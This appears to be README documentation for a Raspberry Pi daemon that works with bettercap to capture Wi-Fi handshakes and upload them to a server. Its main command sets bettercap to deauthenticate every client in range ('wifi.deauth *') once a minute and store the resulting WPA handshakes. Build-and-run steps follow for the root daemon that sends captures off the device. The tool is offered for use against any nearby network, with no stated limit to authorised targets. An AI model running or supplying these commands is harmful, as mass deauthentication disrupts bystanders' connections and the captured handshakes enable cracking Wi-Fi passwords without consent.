The idea of the raspberry-pi part is simple, it is designed for sending captures performed by `bettercap` to the server.
Ideally, you can run the bettercap+deamon on the Raspberry Pi, and it will send the handshakes to the server when your
local-home SSID of your WIFI has been recognized nearby.

> [!NOTE]  
> This feature is disabled if the `TEST` env variable is `False`, but you must make sure that you have, for example, 2 interfaces and one of them is always connected to a network

> Tested on Raspberry-Pi 5 Model B Rev. 2

> [!TIP]
> Change `wlan1` interface with your interface accordingly. Make sure your Wi-Fi card supports monitor mode and packet injection first.

## Run Bettercap

This is an all-in-one.

```bash
sudo bettercap -iface wlan1 -eval 'set wifi.handshakes.aggregate false; set wifi.handshakes.file ~/handshakes; wifi.recon on; set wifi.show.sort clients desc; set ticker.commands "wifi.deauth *; clear; wifi.show"; set ticker.period 60; ticker on';
```

> [!WARNING]  
> Deamon uses as base directory the `HOME` user directory, since bettercap needs sudo you must run deamon as well as root.

### Other useful bettercap commands

```bash
sudo bettercap -iface wlan1
wifi.recon BBSID
wifi.recon on
wifi.recon.channel N; # N is the channel to recon 
```

# Compile and run

> [!IMPORTANT]  
> Deamon needs `libpcap0.8-dev` to be installed

> [!IMPORTANT]  
> `/etc/machine-id` must exist on the machine

```bash
cd raspberry-pi
go mod verify
go mod tidy
go build main.go
sudo ./main
```